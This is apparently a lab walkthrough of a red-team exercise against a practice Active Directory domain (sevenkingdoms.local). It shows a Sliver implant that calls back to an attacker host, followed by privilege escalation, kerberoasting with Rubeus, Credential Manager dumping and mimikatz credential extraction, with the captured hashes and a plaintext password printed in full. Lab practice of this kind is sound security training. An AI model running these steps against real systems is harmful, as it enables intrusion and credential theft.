Sliver is a command and control framework, which I will try to connect to Winterfell.

First I downloaded it to the Kali Machine:

`curl https://sliver.sh/install | sudo bash`

After downloading run it by typing `sliver`.

<img width="891" alt="Pasted_image_20250113142057" src="https://github.com/user-attachments/assets/b0a68494-e9e2-41e6-ac91-49c6409d6eac" />

Now let's generate payload with the `http` communication protocol, that will connect back.

`generate --http 10.4.10.99 --save /home/Documents/sliver/ --format exe`

This created a windows executable:

```bash
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 32s
[*] Implant saved to /home/kali/Documents/sliver/EXTRAORDINARY_STOCK-IN-TRADE.exe
```

Now I used `wmiexec.py` to upload the file to Winterfell.

`wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell`

After uploading the file, in `Sliver` start the http listener, by typing `http`.

```bash
[*] Starting HTTP :80 listener ...
[*] Successfully started job #1
```

After the executable in Windows has been run, I got a connection back, which I can confirm by typing `sessions`:

```bash
[*] Session 132db8b2 EXTRAORDINARY_STOCK-IN-TRADE - 10.4.10.11:57844 (winterfell) - windows/amd64 - Mon, 13 Jan 2025 19:46:22 CET

sliver > sessions

 ID         Name                           Transport   Remote Address     Hostname     Username             Operating System   Locale   Last Message                            Health
========== ============================== =========== ================== ============ ==================== ================== ======== ======================================= =========
 132db8b2   EXTRAORDINARY_STOCK-IN-TRADE   http(s)     10.4.10.11:57844   winterfell   NORTH\eddard.stark   windows/amd64      en-US    Mon Jan 13 19:46:26 CET 2025 (2s ago)   [ALIVE]
```

Now, select the session by `session -i 132`, and I'm in the Winterfell, using Sliver.

```bash
sliver (EXTRAORDINARY_STOCK-IN-TRADE) > whoami

Logon ID: NORTH\eddard.stark
```

# Armory Tools

Since, Winterfell is protected by antivirus, a lot of tools don't work here, so I repeated the steps, and connected to Castelblack.

After having a session to Castelblack and connecting to it, let's enumerate and find some information.

For this, I isntalled the `c2tc-domaininfo` module, via:

`armory install c2tc-domaininfo`

By executing `c2tc-domaininfo` I got the following information:

```bash
[*] Successfully executed c2tc-domaininfo (coff-loader)
[*] Got output:
--------------------------------------------------------------------
[+] DomainName:
    north.sevenkingdoms.local
[+] DomainGuid:
    {18022172-4253-4444-A36F-5F1D1F02D7FB}
[+] DnsForestName:
    sevenkingdoms.local
[+] DcSiteName:
    Default-First-Site-Name
[+] ClientSiteName:
    Default-First-Site-Name
[+] DomainControllerName (PDC):
    \\winterfell.north.sevenkingdoms.local
[+] DomainControllerAddress (PDC):
    \\10.4.10.11
[+] Default Domain Password Policy:
    Password history length: 24
    Maximum password age (d): 37201
    Minimum password age (d): 1
    Minimum password length: 5
[+] Account Lockout Policy:
    Account lockout threshold: 5
    Account lockout duration (m): 5
    Account lockout observation window (m): 5
[+] NextDc DnsHostName:
    winterfell.north.sevenkingdoms.local
--------------------------------------------------------------------
```

Let's try the built in Sliver command `getsystem`, which `spawns a new sliver session as the NT AUTHORITY\SYSTEM user`.

```bash
[*] A new SYSTEM session should pop soon...

[*] Session c783fbf7 EXTRAORDINARY_STOCK-IN-TRADE - 10.4.10.22:52773 (castelblack) - windows/amd64 - Tue, 14 Jan 2025 16:38:15 CET
```

I confirm that with the `whoami`, after I select the new session that has been spawned:

```bash
Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
```

### Kerberoasting

Let's install the `Armory module - Rubeus`:

`armory install rubeus`

Try kerberoasting with the following command:

`rubeus kerberoast`

And I got a list of 3 "kerberoastable" users:

```bash
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : north.sevenkingdoms.local
[*] Searching path 'LDAP://winterfell.north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : sansa.stark
[*] DistinguishedName      : CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[*] ServicePrincipalName   : HTTP/eyrie.north.sevenkingdoms.local
[*] PwdLastSet             : 12/18/2024 6:13:07 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sansa.stark$north.sevenkingdoms.local$HTTP/eyrie.north.sevenkingdoms.local@north.sevenkingdoms.local*$CE64094EE6619557325ED3B7CB7B8D5A$6E30090E72ADCD9B033C52AD955D4AAD87935D275BCD6A2EA89576E99C837D29A41EA3F038D7CCB054A4F0605A384D89D75C5F8B9B28CEFC6BF212DB3FD226DB962F42EFE1AAF5D409BF28A785B2EF8853359667AB1448A2B5949AF30E36A31EA91E19B03BFFBDACFFF331B38C13A2DABE860630A1208649A04CF0119FC00E9A34B84AFE9C16448EFC3EB84CCBA27653D70E03198F64B987D697F11333BA92D8734192F4B152C569F21E4915C9431FD6E6081D329AB3BA9D4DB2A28D9DBFAAE5239051BE91A8067CE3FE8FFE2177C527C2AD2E2FFF85200810B6C257414CE86A327A6B5337532B1D7400D8CDC0B0E6B212FF414FC5C3AFFFDD44F253F80FECAD3F6FDAC6A5C8C4B561EDD86B85BFD2B6D700DDD1A6E9403608780261569603BC31CA4A8D75FF6D03CAF3AEEBACEC488D6D7233B4EF6C462122530AA2D6F3059A327883FAE5325F154B03EB188E2919E659F47F9CA3B5EBFFE951DB2EC4945FF9BA90501795A7D01048288D85C0C0214ECEDA78C03745F3C5085A990A8343A4F1F57D9AD3580D20B106EBD67346F80635CED28CF1B7C753A0E1370B94C9A6A017C9EAD21353087AFE918CC2D8EF0BCE632C865AF623F6BE18170D5C3A9EBA3D5D1A9BE803A53B4DECA6CB94B4AC35DC25027335FF34D5CE602C53D4518824BC03E345A7FB7A9FF7E7DE758BD89C9E136D07D06249DCAC0EAEFCA674E18ECFEB68F649C4F64FE694FD36A0D4422B43C233CC859AAAA71C22B858CBEDA1F4FE022F1389BA44E3E08FC9A6EA109991EBA423C2B7EA33CCB2BF9F8F983C4600B569C13ACCE8ED43C152BF164D6593903236FCEEBD54E3228678D05FF8C910FDE90765E9796A67A932BDBE018342F4AA24C6C7841BF6DF68481CDC8E937AEE5614ED632E2872769F8A64A9CD7E5C26AE707B9124603346CBA1258E501800C7CF7CEF79C02EF4A52809006BE76B4C40D1D37BA9F8CAB5671F648E37D1FE0052B2AC2F3AA5EE06C784DDA35015844E4B768E295B4478580BFE01202BC2FE923546B59ABBBBCD9509594125FEC7E395CD7F77AA0254E5DFFBF948FD4EB687C2374BC7BEB78CA12BD2ACC1595EB545065C9C17D25451089F8761E88B3A828AFB30E7D2AB20DCE6BF7BDD2FFBA9017861B5DB1281DF9BFD8903D7A1FC053AF1BA9C35D50C846DDC643F6C8A39F1A2E05854799663275A77CA944DE222B17D8DDD1B10EEEA19C8C0CF9EA03F023845E799BD75A04911BFCF344DD5C524A557DE2B3E93205BDAA90FBD78CA9436C0E99A6A8EC0301DF8B6BFA62C9C8D1860A7D8B884F765F9EE250062D1248343DF434DE4543304C188F20EC1E750961076DC60A1F881FAC6273EC2F7DC1B3F3C4D5B43177A29B918FF2A3DACED6CF08E5D77FA583B1058B89CC9025CFE47F7F599605E9CC69623453CCACA6A25829BA1BA6DFD774EC2CF1AAE67CC280E5ABCA9893C417E967719AA22D083A9B22C0C21D63383F3C52445F161BC09AEF93ABEF1B6B7EF86AD888FECE0D1C69E763B16B4593A9BAA46102911288427ED63FAD2DD8FCBEBDB16BCDAF5409998994CA1BFB0C68B41E0171C96919D5953D6F43F50EBDA7C5CFC598EEA6EADAFC074C7B10622BAFA79D5A67CA767B9DB4E8CA58C721B9F13F3A1255BE309233FCBB866EBF6B5BF27FA1AE5C0668387C57BCBC5A48C8995CACD129FB30661256618F9D96E3385843CEC4AC5804FFCD282827426765111C9CDE35F1ECAA5109D419EC755689AC1A1B96F3CC986EEAA3F1A299C95E22E6AEBB54192DC80F5E07445D8028AA0C0E8EE


[*] SamAccountName         : jon.snow
[*] DistinguishedName      : CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[*] ServicePrincipalName   : CIFS/thewall.north.sevenkingdoms.local
[*] PwdLastSet             : 12/18/2024 6:13:20 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*jon.snow$north.sevenkingdoms.local$CIFS/thewall.north.sevenkingdoms.local@north.sevenkingdoms.local*$683B4B43AC2A7A040CA1CAB03E55FE4D$8837BEB28706336D5DA7B81EF54469220D457B5AC6C2AFB38B2DB5DCEED8C9591131488CB95975BA272B2A117930D4A7A5ABA8B29D94FD2B696502A0388A900D67C1234BB1BA4D4DA3A320601754336CF39784D634533CB111530E6770AA6ACB0F1E7317574176A09122396E43A69A230BFB9EA53BCDC26491B97306AD33A609C722821C6F7226C2A245E3C7A9CA75175B9D4606E96F9EAC0B4C86D7266EC9CE704FD964994F12FC5450DA27FDB78A7CF216C906DD8CF8224DE4ADD2813FC31F3523443558DBCECBB6B02C9E401D388F229996C35A90212F35647AB7FE94B1220FA90E0D0E4C03410C284CF68DB7A21F95C2C2C087019B281A8DE55CB85AD487697629A1B7FD5DCBEBC6F1A13C9F0EC9A381FAE6C80DDE88AF851CD35A1E915B9700818FC1F71EB152727848120E19A256CE462E08DCC697973181F50A45DE2ABBAE5B2545A299CA258C981DA3DFA0B8153B1E7B5292504914A26BB428822BA4391F18D8DC7E8884BCB8A2597B7C893A9020822517594307D7409ABF9E33FEF9AFCAA6A4EA3B5ACCC05F84C3E4E9AFBE0A4D2BAD6E81EB53567592C8D545F6A129A07A37A39BDB3FEAACE3BE375238AE3E3A4D4FD254009D647BAE48CE8CBB17333571F3B7997BE229F809B312BDC656F26107D41CFC00221909C61730155D8793493C9CB45AFFAE26892910D1E1A088BEF1BA09C6B0064ECF2C3E067094E1DD03CB5892926909FDDFFE835B7F7206FE7D8A6A5AA50F64FF42831B09E27345B7E522FC981C4C219658C99E436C88F7FD6304D6320633352C3B3DC6C22D2EF0CC0913F6CB46803632DC0A3C6FDA339B2537270950EF286051D48C0412312D80BEF7ADE3D1E9FCBA10F9CF42F783DF60643903ABEF0F3D9A4028515FF39BD433C7C636470FE6618280EB5E3EBF211D9205B7D76A1CF1DACD6E1116C9304EAF8C0D12F3CCE22A5B8D268E05C9F7436413996967217072F0A74FCF9E8E80A7220C33879CFA7ADB2495337B6306FE2677EEFD0D67F653788D25495E913F8ED9390E1D3D5CA53D750E5876B6EC7BE7A0E2D502D56A364492E844517EFE3F8E106C0F97224186ECB05F968D984A608DD43C9CCC4BC3024F88C539E292982F15E7895FC40EBA9DEBE1DCF575630AC7E38A77356D5E420872243586017BE6BC87160917F35EC88A58BF18BE0E4D409207B51F2BE280366DF17695639184A08D23C2AC3BAC70E7727FEF88CD0957A5DDF4A2D3DBD18D047A6B55C564D1A03C84B492E17F3A16406681658761CCB64648CA413E96955A36F1ADF79BCFE73D69E82838B3F2D8678F4E47DEE8F74A457DC1E42EC5542B6E4E4873117A4C380ABF9FA943DD523BB6F5246D740402DA538C8770E45551C56599704F766FCCCB42BBA4AC27CA55196E188B6F6AB7F94BF3EDCBA78D001615B2BF6D484E1E1C77DBEE75DE1F0FF191D1BD91650D183536321B85E7C4CE2B3FC2C5BB25AB2DE506CBBBB54E2A607A7B65F0102EEC9110976617CDD83955848C7F2CBC709A67A9F352A4F5B04930D76170A8732C1266A7B7CC9B175D3AF6713151C0C39C2FF2CC221614613B437F6261153DC0E18F0E0F67BFD15593B8F27D2B35C11666FD9D0FA4D1CC426AEE73938B63BAD4932CA0AE20F0286F0EF2D7F4EA658C95A42611FE82E1A5024EA9C19B84463442F7890BA9837458F6A38CC03F8A88AD5E0AA2A7B4AE52E6D45ABC42445EA364CCA23706B12E37C89A75D2484A50DAB6000B485C7007C3D78D2B2EFC5FC4EC28B43E8F6CF6D01DDFF6F4608BC30CA0A99822EAC7708C


[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[*] ServicePrincipalName   : MSSQLSvc/castelblack.north.sevenkingdoms.local
[*] PwdLastSet             : 12/18/2024 6:13:28 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sql_svc$north.sevenkingdoms.local$MSSQLSvc/castelblack.north.sevenkingdoms.local@north.sevenkingdoms.local*$1160AC2E8636D9BB8C51F0D75B45BDBD$043BC4DBB19AABAAB955B86F43C5CE11E351AEDC02959A2D2B3031A946D3D84966A77DAA2552093BABBBD5C943E2459930FB866A041BF38B93F7E71D3312133A8BC59FB2CFE6F30E82859FDDD7105F014D81026E818A273E3B321755F30C18FF1A703F8B8425B23CE60172A64FE98DD0557CCE5878B928EACC1FB5259A1A2AAE9A2052449689011A99E31E17BC537CBA9B70C90E00698E86D0C0A01DA491BA0B84A3FB35A7A0B3984ABA834583D3FF2659B6094E8DFF369FF7A3353E3992D73E62C11108CC0EACCB3B0EE56BB903FD25B5BA8BAC265766E49F310D78A115E3AC378243B7C04614ED1A1F976E8FA685E04E58BE7CD9DA853846768A13112BD2494E7604D4F98062306CC2D78F4B7D7BE9F2FD1C83FB96C9FE7F657D9FC51CC51FE3117930ED75F7721753E4EB31375494C61C1052D14B032AAC07B4AF7881AFFAFF3ADCFEBF097A532F74BEB322561CB472757B9723D4868B6C50E1BAB176BC3816E9BC0B4A029FF654FB160E0C3B3DEA314B91AB7C0EB979F4D2DCADEB029FC2B39EE8B527BED41A16D47CE3C5773D09D208E6AEA0792109E07BB92E551D115CA1D731D8ACC31AA68ACBFFF5BD1A83635C059A75D2BB289D332CB935DFB306ADABF767BCC62A56AC992F0AA08A75A3C1FE99C17D04BBA5780D135B4C6706AA247BD6131B5329FE380FCFF7EA1F3E7A9C90E84117EC0AAADEF7493EF1B18F27EEE8238FB0A6003DDB7C1DACA942DCEF2027DFBCFCE585280CAD87DB3CEA5CFB2DDE5C2072A77BEDA30C4CCF4BA50182FFCFF08A532529CCBE2B842348AACC66CFE1CE7201344BB5306B64B5F51735DE241012AE4766ADB601BD1AAD936A8E04E412B9984E81F63E6042ED96C05A835283C4C7E458DC86D430C4480B3121A5A4511241EBC26335A144818AC09BEEC263F049D56D9A9F28A712AD78CFA0A32CCA19AD52F077399C5ACF09B6CE643BD50B3D05F089F5C1C12D02F789946E49F46AE81C8B6794D8A50105A702615EE6677F60D11DE83A7294DACA5F17DCEBC801592393272C8C91957CD8E3ACC7837747F7BBCC910D0CB26AFAC213BB6528BC9267F52BA5325254E9BC8ACA449C92076A489631EE675669B59454AE3AC598468D6CE01EB7FCF6807742D8F1861BFC8AC4B8BBB8F602EE9A0EC96CFBB8FEEB1C388591B1BA958EB334D45EBB8994F6FCB429CD6F392EDCA52F0FCBFC2CE422237EB0F5BB389B1F1353EBDD106E6D46928A990449ADEC316F0CCCB52C66B9654364D652F979308BAB9AC11F2D457D538A33B283BD34D3C2E901433B606C9B9B40608E9C19D169313130D183D073E6C1CB44C496B6A9139F9B87CD307C0255963A8B8C57865F51C15712B6649A43D0927AE155A6EA80C2A41100DAF1F75BADF7890593C155B1946D569CA68B56670A6E93CB39FC648B0C3BB2D2AE9813885AA5231F618A05A0245CED603A0D02057BA46620D1B446F76AC28352840AAC450D0212B8AABF504B445BEA055DFE1C893D408A56DADA1288874B324D6DE9B4E7FAC70AA9D3FE09A370F225B2F7C5D8F4773573ED07FD3378AC9618D8C1A9E495D3885517D71E1AB5AA0A5B85C925434652371A113B2B9C2A5802959187E3F5541110D846B793B7BE57C23D6245A983A92219E1C3E15F699D50E3AF026A18C84AD8FB08F32FFF12E4C797963C5BC6B2A0ABE730A16A9B665D85ADA9065C9F8136046017C604D0211A3766695941F40BE772830D966DBBD455BEA492A8982129FF5E9304C1570E688270BAF9667EF5787641197B4B9D09DA516778130D3FD7
```


--------------------
`c2tc-klist`

```bash
[*] Successfully executed c2tc-klist (coff-loader)
[*] Got output:

Cached Tickets: (1)

#0>	Client: eddard.stark @ NORTH.SEVENKINGDOMS.LOCAL
	Server: host/winterfell @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: (18) AES256_CTS_HMAC_SHA1_96
	Ticket Flags: 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 1/14/2025 12:17:27
	End Time:   1/14/2025 22:17:27
	Renew Time: 0
	Session Key Type: (23) RC4_HMAC_NT
	Cache Flags: 0x8 -> ASC
	Kdc Called:
```

-----------------------
`credman pid`

`ps`

```bash
 3460   4316   NORTH\robb.stark                         x86_64   ctfmon.exe                                  1
```

`credman 3460`

```bash
[*] Successfully executed credman (coff-loader)
[*] Got output:

------------------------------
Type:Domain Password
Last written: 12/18/2024 - 11:43:25
Persist: Local Machine
Username: north\robb.stark
Password: sexywolfy
Comment: Credential for north\robb.stark
Target name: Domain:target=TERMSRV/castelblack

------------------------------
Type:Generic
Last written: 12/19/2024 - 19:29:29
Persist: Local Machine
Username: 02vxytvzgddqvkhc
Password: (null)
Comment: PersistedCredential
Target name: WindowsLive:target=virtualapp/didlogical


Cleaned up temporary file C:\Users\EDDARD~1.STA\AppData\Local\Temp\bkp759C.tmp
```

---------------
`mimikatz "privilege::debug" "sekurlsa::logopasswords"`

```bash
[*] Successfully executed mimikatz
[*] Got output:

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logopasswords
ERROR mimikatz_doLocal ; "logopasswords" command of "sekurlsa" module not found !

Module :	sekurlsa
Full name :	SekurLSA module
Description :	Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager


sliver (EXTRAORDINARY_STOCK-IN-TRADE) > mimikatz "privilege::debug" "sekurlsa::logonpasswords"

[*] Successfully executed mimikatz
[*] Got output:

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 542204112 (00000000:205160d0)
Session           : Interactive from 4
User Name         : UMFD-4
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/14/2025 12:09:45 PM
SID               : S-1-5-96-0-4
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 193063 (00000000:0002f227)
Session           : Interactive from 1
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 12/30/2024 6:08:07 PM
SID               : S-1-5-21-58534182-3680670537-1634125476-1113
	msv :
	 [00000003] Primary
	 * Username : robb.stark
	 * Domain   : NORTH
	 * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
	 * SHA1     : 3bea28f1c440eed7be7d423cefebb50322ed7b6c
	 * DPAPI    : 654a782dcc73985918057bda38970cc4
	tspkg :
	wdigest :
	 * Username : robb.stark
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : robb.stark
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WINTERFELL$
Domain            : NORTH
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:26 PM
SID               : S-1-5-20
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : winterfell$
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 40194 (00000000:00009d02)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:26 PM
SID               : S-1-5-96-0-0
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 37194 (00000000:0000914a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:24 PM
SID               :
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	kerberos :
	ssp :
	credman :

Authentication Id : 0 ; 547716347 (00000000:20a57cfb)
Session           : Batch from 0
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 1/14/2025 3:17:27 PM
SID               : S-1-5-21-58534182-3680670537-1634125476-1113
	msv :
	 [00000003] Primary
	 * Username : robb.stark
	 * Domain   : NORTH
	 * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
	 * SHA1     : 3bea28f1c440eed7be7d423cefebb50322ed7b6c
	 * DPAPI    : 654a782dcc73985918057bda38970cc4
	tspkg :
	wdigest :
	 * Username : robb.stark
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : robb.stark
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 547281012 (00000000:209ed874)
Session           : Batch from 0
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 1/14/2025 3:01:27 PM
SID               : S-1-5-21-58534182-3680670537-1634125476-1113
	msv :
	 [00000003] Primary
	 * Username : robb.stark
	 * Domain   : NORTH
	 * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
	 * SHA1     : 3bea28f1c440eed7be7d423cefebb50322ed7b6c
	 * DPAPI    : 654a782dcc73985918057bda38970cc4
	tspkg :
	wdigest :
	 * Username : robb.stark
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : robb.stark
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 542207988 (00000000:20516ff4)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/14/2025 12:09:45 PM
SID               : S-1-5-90-0-4
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 497897251 (00000000:1dad4f23)
Session           : RemoteInteractive from 2
User Name         : eddard.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 1/13/2025 10:08:01 AM
SID               : S-1-5-21-58534182-3680670537-1634125476-1111
	msv :
	 [00000003] Primary
	 * Username : eddard.stark
	 * Domain   : NORTH
	 * NTLM     : d977b98c6c9282c5c478be1d97b237b8
	 * SHA1     : 7ce91701e9ad7120b8b7c75feffe7825dc64f9cc
	 * DPAPI    : 60d7c230564f136c55ace428a0dcf1b4
	tspkg :
	wdigest :
	 * Username : eddard.stark
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : eddard.stark
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
